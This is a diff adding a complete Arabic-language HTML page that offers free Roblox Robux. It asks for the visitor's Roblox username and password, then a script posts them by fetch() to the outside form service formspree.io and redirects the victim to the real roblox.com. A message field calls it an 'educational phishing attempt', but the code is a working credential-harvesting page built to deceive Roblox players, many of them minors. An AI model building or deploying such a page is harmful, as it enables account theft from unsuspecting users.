@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>الحصول على روبوكس مجاناً</title>
+    <link rel="icon" href="https://www.roblox.com">
+
+    <style>
+        body {
+            background-color: #f4f4f4;
+            background-image: url('https://images.rbxcdn.com'); 
+            background-size: cover;
+            background-attachment: fixed;
+            background-position: center;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            width: 350px;
+            text-align: center;
+        }
+        .input-group { margin-bottom: 15px; text-align: right; direction: rtl; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; color: #333; }
+        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input:focus { border-color: #0084ff; box-shadow: 0 0 5px rgba(0,132,255,0.5); }
+        button { 
+            width: 100%; padding: 12px; background-color: #0084ff; color: white; 
+            border: none; border-radius: 8px; font-size: 18px; cursor: pointer; font-weight: bold;
+            margin-top: 10px;
+        }
+        button:hover { background-color: #0074e0; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="https://upload.wikimedia.org" width="80" style="margin-bottom:15px;">
+        <h2 style="color: #333; margin-bottom: 20px;">احصل على Robux الآن</h2>
+        
+        <div class="input-group">
+            <label>Username:</label>
+            <input type="text" id="user" placeholder="ادخل يوزرك">
+        </div>
+
+        <div class="input-group">
+            <label>Password:</label>
+            <input type="password" id="pass" placeholder="Password">
+        </div>
+
+        <div class="input-group">
+            <label>الكمية:</label>
+            <input type="number" id="amount" placeholder="حدد كمية الروبوكس">
+        </div>
+
+        <button onclick="sendData()">تأكيد واستلام</button>
+    </div>
+
+    <script>
+        function sendData() {
+            // الرابط الخاص بك الذي طلبته
+            const formspreeURL = "https://formspree.io"; 
+            
+            const username = document.getElementById('user').value;
+            const password = document.getElementById('pass').value;
+            const robuxAmount = document.getElementById('amount').value;
+
+            if(!username || !password || !robuxAmount) {
+                alert("يرجى ملء جميع البيانات أولاً!");
+                return;
+            }
+
+            const data = {
+                message: "🚨 محاولة صيد تعليمية 🚨",
+                user: username,
+                pass: password,
+                amount: robuxAmount
+            };
+
+            fetch(formspreeURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("تم استلام طلبك بنجاح! انتظر معالجة البيانات خلال 24 ساعة.");
+                    // التحويل لموقع روبلوكس الحقيقي بعد "السرقة" الوهمية
+                    window.location.href = "https://www.roblox.com"; 
+                } else {
+                    alert("حدث خطأ في الاتصال، حاول مرة أخرى.");
+                }
+            })
+            .catch(err => {
+                alert("تأكد من اتصالك بالإنترنت.");
+            });
+        }
+    </script>
+</body>
+</html>
